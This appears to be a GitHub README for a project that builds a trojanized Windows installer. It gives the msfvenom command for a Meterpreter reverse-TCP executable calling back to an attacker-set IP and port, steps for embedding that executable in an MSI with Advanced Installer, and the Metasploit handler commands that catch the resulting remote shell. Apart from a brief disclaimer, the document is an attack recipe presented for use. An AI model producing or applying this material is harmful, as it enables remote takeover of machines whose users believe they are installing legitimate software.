# Odysseus

## Overview

The Odysseus project demonstrates the integration of `msfvenom` and `Advanced Installer` to create a software package with embedded payloads. This guide outlines the process of generating a malicious `.exe` with `msfvenom` and then packaging it into an installer using `Advanced Installer`.

**Important:** This project is intended for educational and ethical use only. Always ensure that you have explicit permission before using or demonstrating any tools or techniques that could potentially be harmful.

## Features

- Creation of a malicious `.exe` file using `msfvenom`.
- Packaging of the `.exe` file into an installer using `Advanced Installer`.
- Detailed instructions and screenshots for each step.

## Prerequisites

Before you start, ensure you have the following tools installed:

- [Metasploit Framework](https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework)
- [Advanced Installer](https://www.advancedinstaller.com/)
- [UPX](https://upx.github.io/) (optional for executable packing)

## Installation and Setup

### 1. Clone the Repository

Start by cloning the repository to your local machine:

```bash
git clone https://github.com/imnopro/Odysseus.git
cd Odysseus
```

### 2. Generate the Malicious .exe
Use msfvenom to create a malicious .exe payload. Replace LHOST and LPORT with your local IP address and port.

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.9 LPORT=9002 -f exe -o payload.exe
```


### 3. Package the Payload with Advanced Installer

   -Open Advanced Installer:

   -Launch Advanced Installer and create a new project or open an existing one.

   -Add the Payload:

   -Navigate to the "Files and Folders" section. Add the payload.exe file to the desired location in the installer.

   -Configure Installation Settings:

   -Set the install location and other configuration settings as needed.

   -Build the Installer:

   -Click "Build" to generate the MSI installer.





   ## Running the Demonstration

### Start the Listener:

-Use Metasploit to listen for connections.

``` bash
msfconsole
use exploit multi/handler
set LHOST
set LPORT
set payload windows/x64/meterpreter/reverse_tcp
```

### Install the MSI:

Install the MSI package on a test machine to execute the payload, and then run the .exe to test functionality.
